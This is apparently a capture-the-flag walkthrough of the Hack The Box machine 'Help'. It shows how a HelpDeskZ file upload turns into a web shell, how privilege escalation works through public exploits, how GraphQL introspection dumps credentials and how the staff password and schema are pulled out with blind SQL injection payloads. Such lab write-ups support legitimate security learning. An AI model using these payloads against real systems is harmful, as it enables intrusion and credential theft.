## Help

https://app.hackthebox.com/machines/170

### User Flag

Open ports: 22, 80 and 3000.

Directory /support found, Help Desk Software by HelpDeskZ.

We can enumerate the version by checking README.md based on [this github](https://github.com/ViktorNova/HelpDeskZ/tree/master).

Searching for HelpDeskZ vulnerabilities, we find [this one](https://www.exploit-db.com/exploits/40300).

When we upload files, the system renames it with a weak rename function based on current time.  

This way, we can find the uploaded file name and get a shell.

Looking at github, we discover that uploaded images probably ends in /uploads/tickets.

```
python2 find.py http://help.htb/support/uploads/tickets/ shell.php
```

<br>

### Study of Vulnerability

On [submit_ticket_controller.php](https://github.com/ViktorNova/HelpDeskZ/blob/master/controllers/submit_ticket_controller.php), on line 141 we find this code:

```php
$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
```

This generates a name to the uploaded file based on: **original filename + current timestamp + extension** and hash all in md5.

NOTE: There is a chance that the timestamp of the server differs from our timestamp. To get the correct one, we can extract this from the response headers.

You can find the vulnerable code snippet on vulnCodeUpload.php.

<br>

### Privilege Escalation

There are two paths.

SUID: /usr/lib/s-nail/s-nail-privsep  
Exploit: https://www.exploit-db.com/exploits/47172

If bash interpreter error occurs:
```bash
sed -i -e 's/\r$//' 47172
./47172
```

OR

Kernel is outdated: Linux 4.4.0-116-generic.  
Exploit: https://www.exploit-db.com/exploits/44298

```bash
gcc exploit.c -o exploit
./exploit
```

<br>

### Blind Injection

On port 3000, nmap tell us this is Node.js Express framework and we receive this message:
```
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```

Searching for Express Language Query Node lead us access **/graphql**.

We can perform query introspection:
```
http://help.htb:3000/graphql/?query={__schema{types{name,fields{name,%20args{name,description,type{name,%20kind,%20ofType{name,%20kind}}}}}}}
```

Here we discover that type "User" has fields "username" and "password.

We create a query to dump that and receive credentials: `helpme@helpme.com:5d3c93182bb20f07b994a7f617e99cff`
```
graphql?query={+user+{username,+password+}+}
```

Crack the hash to get: **godhelpmeplz**

<br>

With this credentials, we can explore the other vulnerability on Help Desk: (Authenticated) SQL Injection / Unauthorized File Download.

First you need to get a valid ticket attachment URL.

This returns 200 OK with the attachment content.
```
http://help.htb/suport/v=view_tickets&action=ticket&param[]=2&param[]=attachment&param[]=1&param[]=9+AND+1%3d1
```

This returns 200, but the response is different.
```
http://help.htb/suport/v=view_tickets&action=ticket&param[]=2&param[]=attachment&param[]=1&param[]=9+AND+1%3d2
```

The vulnerable query is at line 94 in **view_tickets_controller.php**.
```php
$attachment = $db->fetchRow("SELECT *, COUNT(id) AS total FROM ".TABLE_PREFIX."attachments WHERE id=".$db->real_escape_string($params[2])." AND ticket_id=".$params[0]." AND msg_id=".$params[3]);
```

To discover database name:
```
and substring(database(),1,1) = 's'
```

To extract password, we can use both payloads:
```
# IppSec used limit 0,1, but without it it also works
and substr((select password from staff limit 0,1),1,1) = 'a'

and substr((select password from staff),1,1) = 'a'
```

Our injectionScript.py try to find 40 characters since password is hashed with sha1 as the source code indicates.

<br>

To go further, we can extract the number of tables from the database and their names. [This article](https://lakshmi993.medium.com/blind-sql-injection-mysql-data-base-d2f35afbc451) helps a lot.
```
# Get number of tables
and (SELECT COUNT(*) AS table_count FROM information_schema.tables WHERE table_schema = 'support') = 19

# This works to find 'articles', the first table
and substring((select table_name from information_schema.tables where table_schema='support' limit 0,1),1,1) = 'a'

# And this works to find 'staff' the fifteen table
and substring((select table_name from information_schema.tables where table_schema='support' limit 15,1),1,1) = 's'
```

And extract the same with columns.
```
# Discover number of columns from 'staff'
and (SELECT COUNT(*) AS column_count FROM information_schema.columns WHERE table_schema = 'support' AND table_name ='staff') = 1

# Finding columns from 'staff'
and substring((select column_name from information_schema.columns where table_name='staff' limit 0,1),1,1) = 's'
```
